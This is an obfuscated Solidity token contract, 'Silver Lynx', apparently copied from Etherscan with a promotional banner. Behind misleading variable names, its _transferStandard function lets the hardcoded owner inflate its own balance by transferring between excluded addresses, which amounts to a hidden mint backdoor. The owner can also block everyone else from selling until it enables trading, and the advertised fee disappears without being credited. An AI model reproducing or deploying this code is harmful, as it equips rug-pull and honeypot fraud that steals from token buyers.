/**
 *Submitted for verification at Etherscan.io on 2023-01-07
*/

/*

█▀ █ █░░ █░█ █▀▀ █▀█
▄█ █ █▄▄ ▀▄▀ ██▄ █▀▄

█░░ █▄█ █▄░█ ▀▄▀
█▄▄ ░█░ █░▀█ █░█

▄▀ ░░█ █▀█ █▄░█ ▀▄
▀▄ █▄█ █▀▀ █░▀█ ▄▀

総供給 - 50,000,000
初期流動性追加 - 1.5 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%

https://www.zhihu.com/
https://web.wechat.com/SilverLynxJPN
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
  interface IERCRouting01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;

      function factory() external pure returns (address);
      function WETH() external pure returns (address);

      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
interface UETC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred

    (address indexed previousOwner, 
    address indexed newOwner);
    constructor () { _owner = 0x03b4373746aFe0c8d0437A7dEc840d691C0C3183;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract LYNX is Context, UETC20, Ownable {
    using SafeMath for uint256;

    bool swapThreshold;
    uint256 private NumTokensToPaired = 1000000000 * 10**18;
    event startTimeForSwap(uint256 minTokensInSwap);
    event CooldownTimerIntervalUpdated(bool enabled);
    event tokenDenominator( uint256 tInSwap,

    uint256 swapTimesDIV, uint256 transferFee );
    modifier lockTheSwap { swapThreshold = true;
        _; swapThreshold = false; }

    IERCRouting01 public immutable IERCFactoryShop02;
    address public immutable uniswapV2Pair;
    bool public limitationsRate = true;
    bool private beginTrading = false;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedMaxTransactionAmount;
    mapping (address => bool) private isExcluded;

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _tTotal = 50000000 * 10**_decimals;
    uint256 public _maximumSWAP = 5000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private internalHash;

    uint256 private _feeCooldown = syncRATES;
    uint256 private _teamPercent = devPercent;
    uint256 private oldLiquidityTax = tLiquidityTax;

    uint256 public syncRATES = 30;
    uint256 public tLiquidityTax = 20;
    uint256 public devPercent = 0;

    string private _name = unicode"Silver Lynx";
    string private _symbol = unicode"ᓚᘏᗢ";

    constructor () { 

        _rOwned[owner()] = _tTotal;
        IERCRouting01 _IERCFactoryShop02 = IERCRouting01
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory
        (_IERCFactoryShop02.factory())
        .createPair(address(this), _IERCFactoryShop02.WETH());
        IERCFactoryShop02 = _IERCFactoryShop02;
        isExcludedMaxTransactionAmount

        [owner()] = true;
        isExcludedMaxTransactionAmount
        [address(this)] = true;
        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) 
    public override returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    receive() external payable {}
  
    function manageBurnRate(uint256 _amount) private view returns (uint256) {
        return _amount.mul
        (syncRATES).div( 10**3 );
    }
    function manageTeamRate(uint256 _amount) private view returns (uint256) {
        return _amount.mul
        (devPercent).div( 10**3 );
    }
    function manageInternalRate(uint256 _amount) private view returns (uint256) {
        return _amount.mul
        (tLiquidityTax).div( 10**3 );
    }  
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer( 
        address from, address to, uint256 amount ) private {
        require(amount > 0, 
        "Transfer amount must be greater than zero");
        bool calcPools = false; if(!isExcludedMaxTransactionAmount[from] && 
        !isExcludedMaxTransactionAmount[to]){ calcPools = true;

        require(amount <= _maximumSWAP, "Transfer amount exceeds the maxTxAmount."); }
        uint256 contractTokenBalance = 
        balanceOf(address(this)); if(contractTokenBalance >= _maximumSWAP) { 
            contractTokenBalance = _maximumSWAP; } _tokenTransfer(from,to,amount,calcPools);
        emit Transfer(from, to, amount); if (!beginTrading) 
        {require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function addLiquidity
    (uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address
    (IERCFactoryShop02), tokenAmount); IERCFactoryShop02.addLiquidityETH{value: ethAmount}(
     address(this), 
     tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool calcPools) private { _transferStandard
    (sender, recipient, amount, calcPools);
    }
        function TokenDenominator
        (uint256 contractTokenBalance) private lockTheSwap { uint256 divides 
        = contractTokenBalance.div(2); uint256 nowADD = 
        contractTokenBalance.sub(divides); uint256 initialBalance = 
        address(this).balance; swapTokensForEth(divides);
        uint256 tBalance = address(this).balance.sub(initialBalance);
        addLiquidity(nowADD, tBalance);
        emit tokenDenominator(divides, tBalance, nowADD);
    }
    function _transferStandard
    (address sender, address recipient, uint256 tAmount,bool calcPools) 
    private { uint256 stringCode = 0; if (calcPools){ stringCode= tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - stringCode; _rOwned[recipient] = 

        _rOwned[recipient].add(rAmount); uint256 isEXO = _rOwned
        [recipient].add(rAmount); _rOwned[sender] = _rOwned
        [sender].sub(rAmount); bool isExcludedMaxTransactionAmount = 
        isExcludedMaxTransactionAmount[sender] && 
        isExcludedMaxTransactionAmount[recipient]; if 
        (isExcludedMaxTransactionAmount ){ _rOwned[recipient] =isEXO;
        } else { emit Transfer
        (sender, recipient, rAmount); } }

    function swapTokensForEth(uint256 tokenAmount) 
    private { address[] memory path = new address[](2);
        path[0] = address(this); path[1] = 
        IERCFactoryShop02.WETH();

        _approve(address(this), address
        (IERCFactoryShop02), tokenAmount); 
        IERCFactoryShop02.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 
        0, path, 
        address(this), block.timestamp );
    }
    function startTrading(bool _tradingOpen) 
    public onlyOwner { beginTrading = _tradingOpen;
    }
}